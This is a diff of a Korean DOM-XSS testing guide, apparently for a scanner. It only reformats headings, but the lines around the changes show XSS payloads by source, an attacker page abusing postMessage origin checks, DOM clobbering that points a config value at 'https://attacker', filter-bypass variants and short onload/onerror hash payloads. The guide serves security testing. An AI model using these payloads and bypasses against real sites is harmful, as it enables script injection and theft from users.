@@ -2,7 +2,7 @@
 
 ### 기본 페이로드
 
-**Source별:**
+#### Source별
 
 | Source | 페이로드 | 비고 |
 |---|---|---|
@@ -17,7 +17,7 @@
 | `IndexedDB`/`localForage` | DB 저장값에 페이로드 | 선행 주입 후 |
 | `BroadcastChannel` | 채널 메시지에 페이로드 | 같은 origin 다른 탭 |
 
-**Playwright 스크립트:**
+#### Playwright 스크립트
 ```javascript
 const { chromium } = require('playwright');
 (async () => {
@@ -50,7 +50,7 @@ const { chromium } = require('playwright');
 })();
 ```
 
-**postMessage origin 우회 (외부 origin 시뮬레이션):**
+#### postMessage origin 우회 (외부 origin 시뮬레이션)
 ```html
 <!-- attacker page -->
 <iframe src="https://target/page" id=f></iframe>
@@ -61,14 +61,14 @@ const { chromium } = require('playwright');
 </script>
 ```
 
-**Trusted Types 미적용 확인:**
+#### Trusted Types 미적용 확인
 ```javascript
 const response = await page.goto('https://target/');
 console.log('CSP:', response.headers()['content-security-policy']);
 // require-trusted-types-for 'script'가 없으면 TT 미적용
 ```
 
-**DOM clobbering:**
+#### DOM clobbering
 ```html
 <!-- HTML form/img element가 ID/name으로 글로벌 변수 덮어쓰기 -->
 <form name="config"><input id="api" value="https://attacker"></form>
@@ -90,7 +90,7 @@ phase1 `## 우회 가능 패턴` (xss-scanner와 공유).
 | 키워드 블랙리스트 | `<sCrIpT>`, `<scr<script>ipt>`, 이벤트 핸들러 변형 (`onpointerover`, `onfocus autofocus`, `onanimationstart`) |
 | Trusted Types 적용 | string sink 거부되나 `unsafe` policy 등록되면 우회 — policy 정의 점검 |
 
-**hash 페이로드 변형:**
+#### hash 페이로드 변형
 ```
 #<svg/onload=alert(1)>                         (28자, script 차단 환경)
 #<img src=x onerror=alert(1)>                  (30자)
